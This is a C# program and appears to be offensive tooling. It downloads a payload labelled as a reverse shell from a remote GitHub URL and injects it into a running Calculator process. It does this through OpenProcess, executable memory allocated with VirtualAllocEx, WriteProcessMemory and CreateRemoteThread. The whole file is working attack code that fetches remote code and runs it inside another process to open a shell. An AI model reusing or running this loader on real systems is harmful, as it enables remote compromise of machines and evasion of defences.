using System;
using System.Net.Http;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Program {


    public static byte[] maliciousDll = GetMaliciousDll("https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/reverse_shell.txt");

    public static byte[] GetMaliciousDll(string url) {
        HttpClient client = new HttpClient();
        HttpResponseMessage response = client.GetAsync(url).Result;
        response.EnsureSuccessStatusCode();
        {
            byte[] maliciousDll = response.Content.ReadAsByteArrayAsync().Result;
            Console.WriteLine("Size of DLL is: " + maliciousDll.Length + " bytes");
        }
        return maliciousDll;
    }

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("Kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    public enum ProcessAccessRights
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    public enum MemAllocation
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
        MEM_RESET = 0x00080000,
        MEM_RESET_UNDO = 0x1000000,
        SecCommit = 0x08000000
    }

    public enum MemProtect
    {
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
        PAGE_EXECUTE_WRITECOPY = 0x80,
        PAGE_NOACCESS = 0x01,
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_WRITECOPY = 0x08,
        PAGE_TARGETS_INVALID = 0x40000000,
        PAGE_TARGETS_NO_UPDATE = 0x40000000,
    }

    public static int SearchForTargetID(string process)
    {
            int pid = 0;
            int session = Process.GetCurrentProcess().SessionId;
            Process[] allprocess = Process.GetProcessesByName(process);

            try
            {
                foreach (Process proc in allprocess)
                {
                    if (proc.SessionId == session)
                {
                    pid = proc.Id;
                    Console.WriteLine("[+] Target process ID found: " + pid);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[+] " + Marshal.GetExceptionCode());
            Console.WriteLine(ex.Message);
        }
        return pid;
    }

    public static void ReflectiveDLLInject(int targetId, byte[] buffer)
        {
            Console.WriteLine("Executing Reflective Dll Injection...");
            try
            {
                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                IntPtr lpThreadId = IntPtr.Zero;

                Console.WriteLine("[+] Attempting to open process");
                IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetId);
                Console.WriteLine("[+] Getting the handle for the target process: " + procHandle);
                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffer.Length, (uint)MemAllocation.MEM_RESERVE, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine("[+] Allocating memory in the remote process " + remoteAddr);
                Console.WriteLine("[+] Writing shellcode at the allocated memory location.");
                if (WriteProcessMemory(procHandle, remoteAddr, buffer, (uint)buffer.Length, out lpNumberOfBytesWritten))
                {
                    Console.WriteLine("[+] Shellcode written in the remote process.");
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);
                }
                else
                {
                    Console.WriteLine("[+] Failed to inject shellcode.");
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

    

    public static void Main(string[] args) {

        string targetProccess = "Calculator";
        int targetProccessId = SearchForTargetID(targetProccess);
        ReflectiveDLLInject(targetProccessId, maliciousDll);

        //byte[] bytes = Encoding.ASCII.GetBytes(someString);
        
        
    }
}